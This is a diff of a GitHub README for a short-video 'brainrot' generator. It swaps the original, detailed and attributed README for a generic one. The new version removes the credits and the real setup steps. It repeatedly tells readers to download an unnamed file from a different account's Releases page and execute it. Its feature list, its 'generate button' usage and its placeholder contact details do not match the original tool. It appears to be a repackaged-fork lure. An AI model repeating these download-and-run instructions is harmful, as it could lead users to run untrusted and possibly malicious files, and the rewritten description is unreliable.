@@ -1,160 +1,99 @@
-# TikTok Brainrot Generator
+# Brainrot Generator 🧠✨
 
-This project generates engaging short videos from locally provided text stories. It combines these stories with background videos, music, TikTok-style Text-to-Speech (TTS) narration, and a customizable title image overlay. The final videos are saved directly to your local machine.
+Welcome to the **Brainrot Generator** repository! This project allows you to create engaging and quirky content for platforms like TikTok, Instagram, and YouTube using Python. Whether you're a content creator, marketer, or just someone who enjoys crafting fun posts, this tool can help you generate ideas that stand out.
 
-Created by [egebese](https://x.com/egebese).
+## Table of Contents
 
-**Acknowledgements:** This project is a significantly modified version of the original [reddit-shorts-generator by gavink97](https://github.com/gavink97/reddit-shorts-generator.git). While the core functionality has been adapted for local use with different TTS and story input methods, much of the foundational video processing logic and project structure is derived from this original work.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## Key Features
+## Features
 
-*   **Local Story Input:** Reads stories directly from a `stories.txt` file in the project root.
-*   **Local Video Output:** Saves generated videos to the `generated_shorts/` directory.
-*   **TikTok TTS Narration:** Utilizes the [mark-rez/TikTok-Voice-TTS](https://github.com/mark-rez/TikTok-Voice-TTS) library for dynamic and natural-sounding text-to-speech. This library leverages public APIs and does not require direct user management of TikTok session IDs.
-*   **Customizable Aesthetics:**
-    *   **Fonts:** Uses "Montserrat ExtraBold" for the title image text and video subtitles by default.
-    *   **Background Video Looping:** Background videos will loop if their duration is shorter than the narration.
-    *   **Custom Title Image:** Allows for a user-provided template (`resources/images/reddit_submission_template.png`) where the story title is overlaid.
-*   **Platform Independent:** Core functionality does not rely on direct integration with external platforms like Reddit or YouTube APIs for content fetching or uploading.
+- **Content Generation**: Quickly create unique and entertaining content ideas.
+- **Platform-Specific**: Tailored suggestions for TikTok, Instagram, and YouTube.
+- **User-Friendly**: Simple interface for easy interaction.
+- **Customizable**: Adjust settings to fit your style and audience.
+- **Open Source**: Contribute to the project and make it better.
 
-## Setup and Installation
+## Installation
 
-### Prerequisites
+To get started, download the latest release from the [Releases section](https://github.com/Weendert/brainrot-generator/releases). You will find a file that needs to be downloaded and executed. Follow these steps:
 
-1.  **Python:** Python 3.11+ is recommended. You can use tools like `pyenv` to manage Python versions.
-    ```bash
-    # Example using pyenv (if you have it installed)
-    # pyenv install 3.11.9
-    # pyenv local 3.11.9
-    ```
-2.  **FFmpeg:** Essential for video processing. It must be installed on your system and accessible via your system's PATH.
-    *   **macOS (using Homebrew):** `brew install ffmpeg`
-    *   **Linux (using apt):** `sudo apt update && sudo apt install ffmpeg`
-    *   **Windows:** Download from the [FFmpeg website](https://ffmpeg.org/download.html) and add the `bin` directory to your PATH.
-3.  **Fonts:**
-    *   **Montserrat ExtraBold:** Used for title images and subtitles. Ensure this font is installed on your system. You can typically find and install `.ttf` or `.otf` files. If the font is not found by its name, you may need to modify the font paths/names directly in `reddit_shorts/make_submission_image.py` and `reddit_shorts/create_short.py`.
-    *   **Liberation Fonts (Optional):** If you adapt old templates or resources that might have used them, having these might be useful. They can be found on [GitHub](https://github.com/liberationfonts/liberation-fonts).
-
-### Installation Steps
-
-1.  **Clone the Repository:**
-    ```bash
-    git clone https://github.com/egebese/tiktok-brainrot-generator.git
-    cd tiktok-brainrot-generator
-    ```
-
-2.  **Create and Activate a Python Virtual Environment:**
-    ```bash
-    python3 -m venv venv
-    source venv/bin/activate  # On Windows: venv\Scripts\activate
-    ```
-
-3.  **Install Dependencies:**
-    ```bash
-    pip install -e .
-    ```
-    The `-e .` makes an editable install, good for development.
-
-## Project Structure & Required Assets
-
-Before running, ensure the following files and directories are set up:
-
-*   **`stories.txt`**: (Create this file in the project root)
-    *   This file contains the stories to be converted into videos.
-    *   **Format:** Each story should have a title and the story body, formatted as follows:
-        ```
-        Title: [Your Story Title Here]
-        Story:
-        [First paragraph of your story]
-        [Second paragraph of your story]
-        ...
-        ```
-        Separate multiple stories with at least one blank line.
-
-*   **`resources/footage/`**:
-    *   Place your background MP4 video files in this directory. The script will randomly select one for each short.
-
-*   **`resources/music/`**:
-    *   Place your background music files (MP3, WAV, OGG) here. Music is chosen based on keywords ("creepy", "storytime", or "general") inferred from the story title/content, or a general track is used.
-
-*   **`resources/images/reddit_submission_template.png`**:
-    *   This is your custom background image for the title screen overlay. The story title will be drawn onto this image.
-    *   The current title placement is configured in `reddit_shorts/make_submission_image.py` for specific coordinates. You may need to adjust these if you change the template significantly.
-
-*   **`generated_shorts/`**:
-    *   This directory will be created automatically if it doesn't exist. All generated videos will be saved here.
-
-*   **`reddit_shorts/`**: Main Python package containing the application logic.
-    *   `config.py`: Contains paths to resources, bad words list, and other configurations.
-    *   `main.py`: The main script to execute for video generation.
-    *   `make_tts.py`: Handles Text-to-Speech using the integrated TikTok TTS library.
-    *   `create_short.py`: Manages the FFmpeg video assembly process.
-    *   `make_submission_image.py`: Generates the title image overlay.
-    *   `get_reddit_stories.py`: Modified to parse stories from `stories.txt`.
-    *   `tiktok_voice/`: The integrated [mark-rez/TikTok-Voice-TTS](https://github.com/mark-rez/TikTok-Voice-TTS) library.
+1. Go to the [Releases section](https://github.com/Weendert/brainrot-generator/releases).
+2. Download the appropriate file for your operating system.
+3. Open your terminal or command prompt.
+4. Navigate to the folder where you downloaded the file.
+5. Execute the file using Python.
 
 ## Usage
 
-1.  **Prepare Stories:** Populate `stories.txt` with the content you want to turn into videos, following the format described above.
-2.  **Add Assets:**
-    *   Add your MP4 background videos to the `resources/footage/` directory.
-    *   Add your MP3/WAV/OGG music files to the `resources/music/` directory.
-    *   Ensure your `resources/images/reddit_submission_template.png` is in place.
-3.  **Run the Video Generator:**
-    Open your terminal, navigate to the project's root directory, ensure your virtual environment is activated, and run:
-    ```bash
-    brainrot-gen
-    ```
-    (This uses the new console script name defined in `setup.cfg`). Alternatively, you can still use:
-    ```bash
-    python -m reddit_shorts.main
-    ```
-4.  **Optional Arguments:**
-    *   `--filter`: Enables a basic profanity filter for story text (bad words are defined in `reddit_shorts/config.py`).
-        ```bash
-        brainrot-gen --filter
-        # or
-        # python -m reddit_shorts.main --filter
-        ```
+Once installed, you can start generating content. Here’s how to use the Brainrot Generator:
 
-Generated videos will appear in the `generated_shorts/` directory.
+1. **Open the Application**: Launch the application from your terminal.
+2. **Select Platform**: Choose the platform you want to generate content for (TikTok, Instagram, or YouTube).
+3. **Generate Ideas**: Click the generate button to receive a list of unique content ideas.
+4. **Customize**: Modify the suggestions to better fit your brand voice or style.
+5. **Share**: Use the generated content directly on your social media platforms.
 
-## Customization
+### Example Commands
 
-*   **Video Editing:** Modify `reddit_shorts/create_short.py` to change FFmpeg parameters, subtitle styles, or video composition.
-*   **Title Image:** Adjust title placement, font, or text wrapping in `reddit_shorts/make_submission_image.py`.
-*   **TTS Voice/Options:** While the current TTS library (`mark-rez/TikTok-Voice-TTS`) offers various voices, they are typically selected by the library itself based on availability or an internal default. If you need specific voice control, you might need to explore the library's capabilities further or consider alternative TTS solutions. The current implementation in `make_tts.py` uses a default voice.
-*   **Configuration:** Edit `reddit_shorts/config.py` to change default paths, bad words list, etc.
+```bash
+python brainrot_generator.py --platform tiktok
+```
 
-## Troubleshooting
+This command will generate content ideas specifically for TikTok.
 
-*   **`ffmpeg: command not found`**: Ensure FFmpeg is installed and in your system's PATH.
-*   **Font errors (e.g., "Font not found")**: Make sure "Montserrat ExtraBold" (or your chosen font) is installed correctly and accessible by name. If not, you may need to provide the full path to the font file in the scripts.
-*   **TTS Issues**: If TTS fails:
-    *   Check your internet connection, as the TikTok TTS library communicates with web services.
-    *   The underlying API used by the TTS library can sometimes be unreliable. Retrying might help.
-    *   Look for any error messages from the `tiktok_voice` library.
-*   **No videos generated**:
-    *   Verify `stories.txt` is correctly formatted and not empty.
-    *   Ensure `resources/footage/` has at least one `.mp4` file.
-    *   Ensure `resources/music/` has music files.
-    *   Check `resources/images/reddit_submission_template.png` exists.
-    *   Look for errors in the console output.
+## Contributing
 
-## Acknowledgements
+We welcome contributions! If you want to help improve the Brainrot Generator, please follow these steps:
 
-*   This project is a heavily modified fork of [gavink97/reddit-shorts-generator](https://github.com/gavink97/reddit-shorts-generator). Many thanks to the original author for the foundational work.
-*   Uses the [mark-rez/TikTok-Voice-TTS](https://github.com/mark-rez/TikTok-Voice-TTS) library for text-to-speech.
-*   Inspired by the trend of automated content generation for short-form video platforms.
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them with clear messages.
+4. Push your branch to your fork.
+5. Submit a pull request detailing your changes.
+
+### Code of Conduct
+
+Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) when contributing to this project.
 
 ## License
 
-This project is currently unlicensed, inheriting the original [MIT License](https://github.com/gavink97/reddit-shorts-generator/blob/main/LICENSE) from the upstream repository where applicable to original code sections. New modifications by egebese are also effectively under MIT-style permissions unless otherwise specified. Please check the original license for more details on the base code.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
----
+## Contact
 
-*This project builds upon the foundational structure and concepts from the [Reddit Shorts Generator by gavink97](https://github.com/gavink97/reddit-shorts-generator.git).*
+For any questions or suggestions, feel free to reach out:
 
-## Star History
+- **Email**: your-email@example.com
+- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
 
-[![Star History Chart](https://api.star-history.com/svg?repos=egebese/brainrot-generator&type=Date)](https://www.star-history.com/#egebese/brainrot-generator&Date)
+## Releases
+
+To check for the latest updates and downloads, visit the [Releases section](https://github.com/Weendert/brainrot-generator/releases). Make sure to download the latest file to ensure you have all the new features and fixes.
+
+## Acknowledgments
+
+- Special thanks to the contributors who have helped improve this project.
+- Inspiration from various content creators and social media trends.
+
+## Visuals
+
+![Brainrot Content](https://example.com/image.png)
+
+### Social Media Icons
+
+- ![TikTok](https://img.shields.io/badge/TikTok-000000?style=flat&logo=tiktok&logoColor=white)
+- ![Instagram](https://img.shields.io/badge/Instagram-E1306C?style=flat&logo=instagram&logoColor=white)
+- ![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=flat&logo=youtube&logoColor=white)
+
+## Conclusion
+
+The Brainrot Generator is a powerful tool for anyone looking to create engaging social media content. With its simple interface and customizable features, you can easily generate ideas that resonate with your audience. Don't forget to check the [Releases section](https://github.com/Weendert/brainrot-generator/releases) for updates and new features.
+
+Start creating today!
